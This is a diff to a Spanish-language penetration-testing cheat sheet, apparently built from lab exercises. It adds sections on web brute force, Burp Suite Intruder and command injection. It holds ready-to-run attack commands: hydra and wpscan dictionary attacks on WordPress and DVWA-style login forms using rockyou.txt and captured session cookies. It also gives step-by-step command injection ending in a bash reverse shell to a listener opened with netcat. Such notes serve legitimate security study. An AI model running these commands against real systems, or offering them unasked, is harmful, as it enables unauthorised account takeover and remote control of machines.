@@ -180,20 +180,46 @@ EXPLOTACION
                         -p: Password 
                   crackmapexec smb 10.10.10.10 -u 'user' -p 'password.txt' => ataque de diccionario a un usuario determinado
 
-      FUERZA BRUTA WEB
-      ................
+      EXPLOTACION WEB
+      ...............
 
-            wpscan -U admin -P /usr/share/wordlist/rockyou.txt --url http://web.com/carpeta => ataque de diccionario al panel de login de wordpress
+            FUERZA BRUTA WEB
+            ................
 
-            hydra –l <user> -P <diccionario> <IP> <servicio>
-            hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
-                  Ejemplo: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low; security=low:F=Username and/or password incorrect' 
+                  wpscan -U admin -P /usr/share/wordlist/rockyou.txt --url http://web.com/carpeta => ataque de diccionario al panel de login de wordpress
+
+                  hydra –l <user> -P <diccionario> <IP> <servicio>
+                  hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
+                     Ej: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low:F=Username and/or password incorrect' 
                            hydra -l admin  -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.26.170/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=2bq42nigi9klq2jdm13g3qa9h3; security=low:F=Username and/or password incorrect'
-                  Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
-                  Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' --> Panel wordpress que no muestra error y redirecciona
+                     Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
+                     Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' --> Panel wordpress que no muestra error y redirecciona
 
-            
+                  Burpsuite
+                     1 - Interceptar peticion
+                     2 - Mandar al intruder   
+                     3 - Seleccionar Payloads: Usuario o contraseña o los dos
+                     4 - Elegir tipo de ataque   
+                           Sniper attack: si conocemos usuario o contraseña
+                           Cluster bomb attack: si no conocemos ni usuario ni contraseña
+                     5 - Cargar lista de usuarios y contraseñas
+                     6 - Start Attack
 
+            COMMAND INJECTION
+            .................
+
+                  1 - Probar en la barra de busqueda el resultado esperado + ; o && o |
+                  2 - Si se ejecutan comandos existe vulnerabilidad
+                  3 - Poner en escucha el kali 
+                        nc -lvnp 4444
+                  4 - Poner en el buscador el valor esperado + revershell
+                        bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+                  5 - Debe conectarse, si no probar sh, perl, o cualquier otra shell
+
+            CSRF/CROSS SITE REQUEST FORGERY
+            ...............................
+                  Esta vulnerabilidad aprovecha el cambio de contraseña. En la url aparece usuario y contraseña.  
+      
       BUSCAR EXPLOIT
       ..............
 
@@ -249,8 +275,8 @@ EXPLOTACION
                   -m => tipo de hash
                   https://hashcat.net/wiki/doku.php?id=hashcat => flags de hashcat
 
-RDP
-...
+     RDP
+     ...
 
       xfreerdp /v:[IP] -sec-nla /u:"" -- Recon
       xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo
